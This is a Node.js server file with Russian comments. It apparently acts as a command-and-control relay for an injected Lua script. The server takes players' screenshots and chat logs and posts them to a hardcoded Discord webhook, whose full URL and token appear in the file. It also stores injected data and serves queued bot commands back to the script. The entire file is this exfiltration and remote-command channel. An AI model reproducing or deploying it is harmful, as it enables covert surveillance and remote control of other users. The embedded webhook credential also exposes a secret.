const http = require('http');
const fetch = require('node-fetch');

const WEBHOOK_URL = "https://discord.com/api/webhooks/1397978005007110334/13sdkqWcsZu_YoyBgOpoWgrPfOzHBRL-R8dydXTLYI7KZIc4jSKlpcUX16vrrrC1nQqS";

let lastCommand = "";
let lastArgs = [];
let lastInjectData = null;

const server = http.createServer((req, res) => {
    // Прием данных от Lua (скриншоты, логи чата и т. д.)
    if (req.url === '/inject' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            const data = JSON.parse(body);
            
            if (data.type === "screenshot") {
                // Отправка скриншота в Discord
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `📸 **Скриншот от ${data.player}**`,
                        embeds: [{ image: { url: data.image } }]
                    })
                });
            } else if (data.type === "chatlog") {
                // Отправка логов чата
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `💬 **Чат от ${data.player}:** \`${data.message}\``
                    })
                });
            } else {
                lastInjectData = data; // Сохранение данных инжекта
            }
            
            res.writeHead(200);
            res.end("OK");
        });
        return;
    }

    // Установка команды от бота
    if (req.url === '/command' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            const { command, args } = JSON.parse(body);
            lastCommand = command;
            lastArgs = args || [];
            res.writeHead(200);
            res.end("OK");
        });
        return;
    }

    // Получение данных для Lua
    if (req.url === '/data' && req.method === 'GET') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            command: lastCommand,
            args: lastArgs,
            injectData: lastInjectData
        }));
        lastCommand = "";
        lastArgs = [];
        return;
    }

    res.writeHead(404);
    res.end("Not Found");
});

server.listen(process.env.PORT || 3000);
